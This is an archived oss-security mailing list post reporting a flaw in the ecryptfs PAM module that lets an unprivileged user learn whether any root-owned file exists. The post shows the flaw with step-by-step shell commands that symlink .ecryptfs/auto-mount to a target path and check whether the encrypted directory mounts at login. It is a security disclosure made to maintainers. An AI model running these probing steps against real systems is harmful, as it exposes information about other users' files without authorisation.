  oss-security - Re: Re: ecryptfs headsup            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Sat, 14 Jul From: "Jason A. Donenfeld" <Jason@...c4.com> To: oss-security@...ts.openwall.com Cc: Tyler Hicks <tyhicks@...onical.com>, Kurt Seifried <kseifried@...hat.com>,  	Marcus Meissner <meissner@...e.de>, Dan Rosenberg <dan.j.rosenberg@...il.com> Subject: Re: Re: ecryptfs headsup  Looks like another issue with that pam module. I can determine whether or not any file exists as an unprivileged user:  We make sure that we have an existing root file and a non-existing root file: zx2c4@...g ~ $ sudo touch /root/this-file-exists zx2c4@...g ~ $ sudo rm -f /root/this-file-does-not-exist  We double check that zx2c4 can't know about them: zx2c4@...g ~ $ stat /root/this-file-exists stat: cannot stat `/root/this-file-exists': Permission denied zx2c4@...g ~ $ stat /root/this-file-does-not-exist stat: cannot stat `/root/this-file-does-not-exist': Permission denied zx2c4@...g ~ $ ls /root ls: cannot open directory /root: Permission denied  We replace .ecryptfs/auto-mount with a symlink to a root file that does not exist: zx2c4@...g ~ $ rm -f .ecryptfs/auto-mount zx2c4@...g ~ $ ln -s /root/this-file-does-not-exist .ecryptfs/auto-mount   And we see that our private directory doesn't get mounted: zx2c4@...g ~ $ sudo login zx2c4 Password: Last login: Sat Jul 14 EDT on pts/5 zx2c4@...g ~ $ mount|grep ecrypt  zx2c4@...g ~ $ exit  We next replace .ecryptfs/auto-mount with a symlink to a root file that *does* exist: zx2c4@...g ~ $ rm -f .ecryptfs/auto-mount zx2c4@...g ~ $ ln -s /root/this-file-exists .ecryptfs/auto-mount  And we see that it does in fact get mounted: zx2c4@...g ~ $ sudo login zx2c4 Password: Last login: Sat Jul 14 EDT on pts/5 zx2c4@...g ~ $ mount|grep ecrypt /home/zx2c4/.Private on /home/zx2c4/Private type ecryptfs  File existence disclosure.  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      